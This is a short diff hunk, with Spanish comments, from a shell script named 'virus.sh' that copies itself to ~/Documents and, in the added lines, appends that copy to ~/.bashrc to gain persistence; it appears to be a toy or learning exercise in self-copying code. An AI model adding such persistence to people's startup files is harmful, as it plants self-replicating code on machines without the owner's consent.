@@ -17,3 +17,7 @@ done
 # FEAT: Copiar script a otra carpeta
 echo "📦 Copiando a ~/Documents..."
 cp virus.sh ~/Documents/virus_copia.sh
+
+# FEAT: Añadir a .bashrc
+echo "🔗 Agregando persistencia..."
+echo "~/Documents/virus_copia.sh" >> ~/.bashrc
